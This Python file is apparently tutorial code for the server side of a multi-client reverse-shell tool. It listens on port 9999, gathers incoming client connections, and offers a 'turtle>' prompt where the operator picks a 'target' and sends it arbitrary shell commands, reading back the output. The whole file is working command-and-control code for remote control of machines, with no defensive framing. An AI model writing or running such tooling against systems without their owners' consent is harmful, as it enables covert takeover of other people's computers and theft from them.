"""A python file for the server."""
import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2  # number of tasks that need to be done simultaneously
JOB_NUMBER = [1, 2]  # labels of the jobs that need to be done [listening, sending commands] in this case
queue = Queue()
all_connections = []
all_addresses = []

# important functions


def create_socket():
    """Creates a socket to make a connection between two computers."""
    try:
        global host
        global port
        global sockett
        # when global variables are declared, they can be accessed outside the function domain.
        host = ""
        port = 9999
        sockett = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))

# Binding the socket and listening to connections


def bind_socket():
    """A function to bind sockets and listen for connections."""
    try:
        global host
        global port
        global sockett  # when accessing the values of variables that are globals of other functions, redeclare them.
        print("Binding the port: {}".format(port))

        sockett.bind((host, port))
        sockett.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n\n" + "Retrying...")
        bind_socket()

# handling connections from multiple clients, and saving connection objects and addresses to predefined lists.
# closing previous connections when server.py is restarted


def accepting_connections():
    """Accepts all the connections that are attempting to connect."""
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = sockett.accept()
            sockett.setblocking(1)  # prevents timeout

            all_connections.append(conn)
            all_addresses.append(address)

            print("Connection has been established: " + address[0])

        except:
            print("Error accepting connections")

# second function: 1) See all clients, 2) select a client, 3) connect to the client remotely
# building a terminal shell to control these clients


def start_turtle():
    """Starts a custom interactive shell called turtle, to enable client control."""
    while True:
        command = input("turtle> ")

        if command == "list":
            show_all_connections()

        elif "select" in command:
            conn = get_target(command)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognized")


def show_all_connections():
    """Shows all available connections."""
    resultss = ''
    for i, connection in enumerate(all_connections):
        try:
            connection.send(str.encode("  "))
            connection.recv(234323)  # sends a dummy connection request to see which connection is active.
        except:
            print("Connection inactive, to be deleted!")
            del all_connections[i]
            del all_addresses[i]
            continue
        resultss = resultss + str(i) + "  |  " + str(all_addresses[i][0]) + "  |  " + str(all_addresses[i][1]) + "\n"
    print("-----Clients------" + "\n" + resultss)


def get_target(cmd):
    """Returns a connection object based on an entered command."""
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        connection = all_connections[target]
        print("Connection established! You are now connected!")
        print("Client Number: " + str(target) + ">", end="")  # "end" parameter prevents us from hitting useless enters
        # above line tells when the server is connected to a client
        return connection
    except:
        print("Selection Invalid!")
        return None


def send_target_commands(connection):
    """Sends commands to the target client."""
    while True:
        try:
            command = input().strip()
            if command == "quit":
                # connection.close()
                # sockett.close()
                # sys.exit()
                break
            if len(str.encode(command)) > 0:
                connection.send(str.encode(command))
                client_response = str(connection.recv(20480), "utf-8")  # basically says convert client response to str
                print(client_response, end="")
        except:
            print("Error sending commands")
            break  # this break is reached when connection is interrupted. Breaking this loop will allow reconnection.

# Create workers for multi threading


def create_workers():
    """A function that creates workers, to add multi-client support."""
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    """Does the next job in the queue, could be handling connections or sending commands to a connected client."""
    while True:
        task = queue.get()
        if task == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if task == 2:
            start_turtle()
        queue.task_done()


def create_jobs():
    """Adds the jobs to the queue."""
    for i in JOB_NUMBER:
        queue.put(i)
    queue.join()


if __name__ == "__main__":
    create_workers()
    create_jobs()
